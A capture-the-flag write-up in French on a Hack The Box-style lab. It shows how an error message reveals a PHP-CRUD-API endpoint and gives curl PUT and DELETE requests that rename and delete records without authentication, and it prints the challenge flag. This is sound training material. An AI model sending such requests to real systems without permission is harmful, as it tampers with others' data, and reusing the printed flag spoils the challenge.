# Writeup — Manipulation d'une API CRUD

## Objectif

> Mettre à jour le nom d'une ville pour qu'il devienne "flag", supprimer une autre ville, puis rechercher une ville nommée "flag" pour obtenir le flag.

## Démarche

### 1. Repérage de l'endpoint

Les chemins classiques (`/login.php`, `/api/login`, `/cities.php`...) renvoient des `404`. Une requête vers `/api.php` renvoie une erreur SQL révélatrice :

```
Incorrect table name ''
```

Ce message confirme que `api.php` existe et attend un nom de table dans l'URL — signature typique d'un outil de type PHP-CRUD-API.

### 2. Découverte de la table et de la clé primaire

```cmd
curl.exe -i "http://<IP>:<PORT>/api.php/city"
```

Retourne la liste complète des villes au format JSON. Un test sur `/api.php/city/1` renvoie `[]` (aucune ville avec cet identifiant), mais `/api.php/city/London` renvoie bien la ville "London" : la clé primaire de la table est donc le **nom de la ville** (`city_name`), pas un identifiant numérique.

### 3. Mise à jour (update)

```cmd
curl.exe -i -X PUT "http://<IP>:<PORT>/api.php/city/London" -H "Content-Type: application/json" -d "{\"city_name\":\"flag\"}"
```

Vérification :

```cmd
curl.exe -i "http://<IP>:<PORT>/api.php/city/flag"
```

```json
[{"city_name":"flag","country_name":"(UK)"}]
```

### 4. Suppression (delete)

```cmd
curl.exe -i -X DELETE "http://<IP>:<PORT>/api.php/city/Birmingham"
```

### 5. Récupération du flag

Après update et delete, la ressource `/api.php/city/flag` contient le flag recherché.

## Résultat

**Flag : `HTB{crud_4p!_m4n!pul4t0r}`**

## Points clés retenus

- Une erreur SQL renvoyée par le serveur peut révéler la structure interne d'une API (nom d'endpoint, nom de table).
- Toujours tester la clé primaire réelle d'une ressource avant de tenter un update/delete (ici un nom, pas un ID numérique).
- Le modèle CRUD se mappe directement sur les méthodes HTTP : `POST` (Create), `GET` (Read), `PUT` (Update), `DELETE` (Delete).
